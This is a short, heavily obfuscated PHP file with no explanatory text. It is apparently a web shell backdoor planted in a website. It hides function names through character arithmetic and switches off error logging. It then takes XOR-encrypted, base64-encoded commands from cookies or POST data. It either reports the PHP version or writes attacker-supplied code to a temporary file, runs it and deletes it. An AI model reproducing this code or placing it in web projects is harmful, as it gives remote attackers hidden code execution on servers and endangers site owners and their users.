<?php $shzzwtsheu = "\146".chr(105).chr(108).'e'.chr(911-816).chr(1110-998).'u'."\164".chr(831-736).chr(863-764)."\x6f".chr(489-379).'t'.chr(101)."\x6e".chr(116).chr(614-499);
$avkugowevx = 'b'."\141".chr(941-826)."\145"."\x36".'4'."\137".chr(209-109).chr(101).chr(672-573)."\x6f"."\144"."\x65";
$xbanhzvtsu = "\151"."\x6e".'i'.chr(176-81)."\x73".chr(101).chr(999-883);
$hpmbx = "\165"."\x6e".'l'.chr(486-381).'n'.chr(107);


@$xbanhzvtsu("\x65"."\162".chr(114)."\157".chr(114)."\x5f"."\154"."\157"."\x67", NULL);
@$xbanhzvtsu("\x6c".chr(111)."\147".chr(868-773).'e'."\162"."\162"."\157"."\x72".'s', 0);
@$xbanhzvtsu('m'.chr(401-304).chr(660-540)."\x5f".chr(1098-997).'x'.'e'.chr(99)."\x75".chr(116).chr(587-482)."\157".'n'.'_'."\x74".'i'.chr(276-167)."\145", 0);
@set_time_limit(0);

function sizqjubbux($tornzhiy, $tnisove)
{
    $xsiytix = "";
    for ($kubvdmu = 0; $kubvdmu < strlen($tornzhiy);) {
        for ($j = 0; $j < strlen($tnisove) && $kubvdmu < strlen($tornzhiy); $j++, $kubvdmu++) {
            $xsiytix .= chr(ord($tornzhiy[$kubvdmu]) ^ ord($tnisove[$j]));
        }
    }
    return $xsiytix;
}

$pltawt = array_merge($_COOKIE, $_POST);
$aigjdf = 'ce6fb78b-fc56-4925-8547-dac272115970';
foreach ($pltawt as $kubvdmujxyl => $tornzhiy) {
    $tornzhiy = @unserialize(sizqjubbux(sizqjubbux($avkugowevx($tornzhiy), $aigjdf), $kubvdmujxyl));
    if (isset($tornzhiy[chr(97).chr(762-655)])) {
        if ($tornzhiy[chr(97)] == "\151") {
            $kubvdmu = array(
                'p'.chr(1023-905) => @phpversion(),
                's'.chr(118) => "3.5",
            );
            echo @serialize($kubvdmu);
        } elseif ($tornzhiy[chr(97)] == 'e') {
            $okugcefgy = "./" . md5($aigjdf) . "\x2e".chr(105)."\156".chr(99);
            @$shzzwtsheu($okugcefgy, "<" . "\77".'p'."\150"."\160"."\40".'@'."\165"."\x6e"."\x6c"."\151"."\x6e".chr(107)."\x28".chr(876-781)."\x5f"."\106".'I'.chr(1050-974).chr(992-923)."\x5f"."\x5f".chr(398-357).chr(306-247).' ' . $tornzhiy["\144"]);
            @include($okugcefgy);
            @$hpmbx($okugcefgy);
        }
        exit();
    }
}

